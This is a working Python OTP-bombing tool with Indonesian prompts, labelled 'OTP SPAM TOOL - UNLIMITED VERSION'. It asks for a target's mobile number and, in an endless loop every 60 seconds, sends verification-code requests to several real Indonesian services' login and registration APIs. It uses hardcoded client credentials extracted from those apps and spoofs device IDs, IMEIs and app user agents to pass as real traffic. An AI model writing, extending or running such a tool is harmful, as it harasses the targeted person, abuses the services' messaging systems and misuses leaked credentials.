#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import random
import string
import time
import os
import signal
import sys

# Color codes
BLACK = '\x1b[1;30m'
RED = '\x1b[1;31m'
WHITE = '\x1b[1;37m'
GREEN = '\x1b[1;32m'
BLUE = '\x1b[1;34m'
CYAN = '\x1b[1;36m'
YELLOW = '\x1b[1;33m'
RESET = '\x1b[0m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def signal_handler(sig, frame):
    print(f'\n{BLACK}[{RED}!{BLACK}]{WHITE} Program dihentikan{RESET}')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def codex(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def send_adiraku(nomor):
    url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata'
    payload = {'mobileNumber': nomor, 'type': 'prospect-create', 'channel': 'whatsapp'}
    try:
        res = requests.post(url, json=payload, timeout=10)
        result = json.loads(res.text).get('message', '')
        if result == 'success':
            print(f' {BLACK}[{GREEN}✓{BLACK}]{WHITE} Berhasil Mengirim OTP Ke {CYAN}{nomor}{RESET}')
        else:
            print(f' {BLACK}[{RED}✗{BLACK}]{WHITE} Gagal Mengirim OTP Ke {CYAN}{nomor}{RESET}')
    except Exception as e:
        print(f' {BLACK}[{RED}!{BLACK}]{WHITE} Adiraku Error{RESET}')

def send_singa(nomor):
    url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
    payload = {'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}
    headers = {'Content-Type': 'application/json; charset=utf-8'}
    try:
        res = requests.post(url, json=payload, headers=headers, timeout=10)
        result = json.loads(res.text).get('msg', '')
        if result == 'Success':
            print(f' {BLACK}[{GREEN}✓{BLACK}]{WHITE} Berhasil Mengirim OTP Ke {CYAN}{nomor}{RESET}')
        else:
            print(f' {BLACK}[{RED}✗{BLACK}]{WHITE} Gagal Mengirim OTP Ke {CYAN}{nomor}{RESET}')
    except Exception as e:
        print(f' {BLACK}[{RED}!{BLACK}]{WHITE} Singa Error{RESET}')

def send_speedcash(nomor):
    url_token = 'https://sofia.bmsecure.id/central-api/oauth/token'
    headers_token = {'Authorization': 'Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==', 'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        res_token = requests.post(url_token, data='grant_type=client_credentials', headers=headers_token, timeout=10)
        auth = json.loads(res_token.text).get('access_token', '')
        if not auth:
            print(f' {BLACK}[{RED}!{BLACK}]{WHITE} Gagal Mendapatkan Token SpeedCash{RESET}')
            return
    except Exception as e:
        print(f' {BLACK}[{RED}!{BLACK}]{WHITE} SpeedCash Error{RESET}')
        return
    url_otp = 'https://sofia.bmsecure.id/central-api/sc-api/otp/generate'
    payload_otp = {'version_name': '6.2.1 (428)', 'phone': nomor, 'appid': 'SPEEDCASH', 'version_code': 428, 'location': '0,0', 'state': 'REGISTER', 'type': 'WA', 'app_id': 'SPEEDCASH', 'uuid': '00000000-4c22-250d-ffff-ffff' + codex(8), 'via': 'BB ANDROID'}
    headers_otp = {'Authorization': f'Bearer {auth}', 'Content-Type': 'application/json'}
    try:
        res_otp = requests.post(url_otp, json=payload_otp, headers=headers_otp, timeout=10)
        result = json.loads(res_otp.text).get('rc', '')
        if result == '00':
            print(f' {BLACK}[{GREEN}✓{BLACK}]{WHITE} Berhasil Mengirim OTP Ke {CYAN}{nomor}{RESET}')
        else:
            print(f' {BLACK}[{RED}✗{BLACK}]{WHITE} Gagal Mengirim OTP Ke {CYAN}{nomor}{RESET}')
    except Exception as e:
        print(f' {BLACK}[{RED}!{BLACK}]{WHITE} SpeedCash Error{RESET}')

def otp_bisatopup(nomor):
    url = f'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id={codex(16)}&version_name=6.12.04&version=61204'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'phone_number': nomor}
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        try:
            result = response.json().get('message', '')
        except:
            result = response.text
        if result == 'OTP akan segera dikirim ke perangkat':
            print(f' {BLACK}[{GREEN}✓{BLACK}]{WHITE} Berhasil Mengirim OTP Ke {CYAN}{nomor}{RESET}')
        else:
            print(f' {BLACK}[{RED}✗{BLACK}]{WHITE} Gagal Mengirim OTP Ke {CYAN}{nomor}{RESET}')
    except Exception as e:
        print(f' {BLACK}[{RED}!{BLACK}]{WHITE} BisaTopUp Error{RESET}')

def jogjakita(nomor):
    try:
        url_token = 'https://aci-user.bmsecure.id/oauth/token'
        payload_token = 'grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1'
        headers_token = {'authorization': 'Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQzNzgyNjRhZWEyZQ==', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'okhttp/4.10.0'}
        r1 = requests.post(url_token, data=payload_token, headers=headers_token, timeout=10)
        r1.raise_for_status()
        data1 = r1.json()
        auth = data1.get('access_token')
        if not auth:
            print(f' {BLACK}[{RED}!{BLACK}]{WHITE} Gagal ambil access_token{RESET}')
            return
        url_otp = 'https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send'
        payload_otp = {'phone_user': nomor, 'primary_credential': {'device_id': '', 'fcm_token': '', 'id_kota': 0, 'id_user': 0, 'location': '0.0,0.0', 'uuid': '', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakita_user'}, 'uuid': '00000000-4c22-250d-3006-9a465f072739', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakita_user'}
        headers_otp = {'Content-Type': 'application/json; charset=UTF-8', 'Authorization': f'Bearer {auth}'}
        r2 = requests.post(url_otp, json=payload_otp, headers=headers_otp, timeout=10)
        r2.raise_for_status()
        data2 = r2.json()
        if str(data2.get('rc')) == '200':
            print(f' {BLACK}[{GREEN}✓{BLACK}]{WHITE} Berhasil Mengirim OTP Ke {CYAN}{nomor}{RESET}')
        else:
            print(f' {BLACK}[{RED}✗{BLACK}]{WHITE} Gagal Mengirim OTP Ke {CYAN}{nomor}{RESET}')
    except Exception as e:
        print(f' {BLACK}[{RED}!{BLACK}]{WHITE} JogjaKita Error{RESET}')

def cairin(nomor):
    url = 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT'
    data = {'appVersion': '3.0.4', 'phone': nomor, 'userImei': codex(32)}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        response = requests.post(url, data=data, headers=headers, timeout=10)
        if response.text.strip() == '{"code":"0"}':
            print(f' {BLACK}[{GREEN}✓{BLACK}]{WHITE} Berhasil Mengirim OTP Ke {CYAN}{nomor}{RESET}')
        else:
            print(f' {BLACK}[{RED}✗{BLACK}]{WHITE} Gagal Mengirim OTP Ke {CYAN}{nomor}{RESET}')
    except Exception as e:
        print(f' {BLACK}[{RED}!{BLACK}]{WHITE} Cairin Error{RESET}')

def adiraku(nomor):
    url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata'
    payload = {'mobileNumber': nomor, 'type': 'prospect-create', 'channel': 'whatsapp'}
    headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'okhttp/4.9.0'}
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        r.raise_for_status()
        response = r.json()
        if response.get('message') == 'success':
            print(f' {BLACK}[{GREEN}✓{BLACK}]{WHITE} Berhasil Mengirim OTP Ke {CYAN}{nomor}{RESET}')
        else:
            print(f' {BLACK}[{RED}✗{BLACK}]{WHITE} Gagal Mengirim OTP Ke {CYAN}{nomor}{RESET}')
    except Exception as e:
        print(f' {BLACK}[{RED}!{BLACK}]{WHITE} ADIRAKU V2 Error{RESET}')

def banner_spam_otp_only():
    clear()
    print(f"""{CYAN}
    ╔════════════════════════════════════════════════════════════╗
    ║                                                            ║
    ║   {YELLOW}███████{CYAN}╗{YELLOW}██████{CYAN}╗ {YELLOW}█████{CYAN}╗{YELLOW}███{CYAN}╗   {YELLOW}███{CYAN}╗                     ║
    ║   {YELLOW}██{CYAN}╔════╝{YELLOW}██{CYAN}╔══{YELLOW}██{CYAN}╗{YELLOW}██{CYAN}╔══{YELLOW}██{CYAN}╗{YELLOW}████{CYAN}╗ {YELLOW}████{CYAN}║                     ║
    ║   {YELLOW}███████{CYAN}╗{YELLOW}██████{CYAN}╔╝{YELLOW}███████{CYAN}║{YELLOW}██{CYAN}╔{YELLOW}████{CYAN}╔{YELLOW}██{CYAN}║                     ║
    ║   ╚════{YELLOW}██{CYAN}║{YELLOW}██{CYAN}╔═══╝ {YELLOW}██{CYAN}╔══{YELLOW}██{CYAN}║{YELLOW}██{CYAN}║╚{YELLOW}██{CYAN}╔╝{YELLOW}██{CYAN}║                     ║
    ║   {YELLOW}███████{CYAN}║{YELLOW}██{CYAN}║     {YELLOW}██{CYAN}║  {YELLOW}██{CYAN}║{YELLOW}██{CYAN}║ ╚═╝ {YELLOW}██{CYAN}║                     ║
    ║   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝                     ║
    ║                                                            ║
    ║            {WHITE}OTP SPAM TOOL - UNLIMITED VERSION{CYAN}              ║
    ║                                                            ║
    ╚════════════════════════════════════════════════════════════╝
    {RESET}""")

def nomor_otp():
    while True:
        banner_spam_otp_only()
        try:
            nomor = input(f' {BLACK}[{YELLOW}?{BLACK}]{WHITE} Masukkan Nomor Target {RED}→{WHITE} ')
            print()
            if nomor.startswith('08') and nomor.isdigit():
                return nomor
            else:
                input(f" {BLACK}[{RED}!{BLACK}]{WHITE} Format Nomor Tidak Valid {BLACK}| {GREEN}ENTER{RESET}")
        except (EOFError, KeyboardInterrupt):
            input(f" {BLACK}[{RED}!{BLACK}]{WHITE} Program Dihentikan {BLACK}| {GREEN}ENTER{RESET}")
            sys.exit(0)

def unlimited_spam():
    try:
        nomor = nomor_otp()
        count = 0

        while True:
            count += 1
            print(f'\n{BLACK}[{CYAN}BATCH #{count}{BLACK}]{WHITE} Memulai spam OTP...{RESET}')
            print(f'{CYAN}{"═" * 60}{RESET}')

            send_adiraku(nomor)
            send_singa(nomor)
            send_speedcash(nomor)
            otp_bisatopup(nomor)
            jogjakita(nomor)
            cairin(nomor)
            adiraku(nomor)

            print(f'{CYAN}{"═" * 60}{RESET}')
            print(f'{BLACK}[{GREEN}✓{BLACK}]{WHITE} Batch #{count} Selesai. Delay 60 detik...{RESET}')
            print(f'{BLACK}[{YELLOW}INFO{BLACK}]{WHITE} Tekan CTRL+C untuk berhenti{RESET}')
            time.sleep(60)

    except KeyboardInterrupt:
        print(f'\n{BLACK}[{RED}!{BLACK}]{WHITE} Program dihentikan setelah {count} batch{RESET}')
        sys.exit(0)

def check_password():
    clear()
    print(f"""{CYAN}
    ╔════════════════════════════════════════════════════════════╗
    ║                                                            ║
    ║               {YELLOW}🔒 AUTHENTICATION REQUIRED 🔒{CYAN}                ║
    ║                                                            ║
    ╚════════════════════════════════════════════════════════════╝
    {RESET}""")
    
    attempts = 0
    max_attempts = 3
    
    while attempts < max_attempts:
        try:
            password = input(f' {BLACK}[{YELLOW}?{BLACK}]{WHITE} Masukkan Password {RED}→{WHITE} ')
            
            if password == 'icikiwir':
                print(f' {BLACK}[{GREEN}✓{BLACK}]{WHITE} Password Benar! Akses Diberikan{RESET}')
                time.sleep(1)
                return True
            else:
                attempts += 1
                remaining = max_attempts - attempts
                if remaining > 0:
                    print(f' {BLACK}[{RED}✗{BLACK}]{WHITE} Password Salah! Sisa percobaan: {RED}{remaining}{RESET}')
                else:
                    print(f' {BLACK}[{RED}✗{BLACK}]{WHITE} Password Salah! Akses Ditolak{RESET}')
                    time.sleep(2)
                    sys.exit(1)
        except (EOFError, KeyboardInterrupt):
            print(f'\n{BLACK}[{RED}!{BLACK}]{WHITE} Program Dibatalkan{RESET}')
            sys.exit(0)

def main():
    check_password()
    unlimited_spam()

if __name__ == '__main__':
    main()
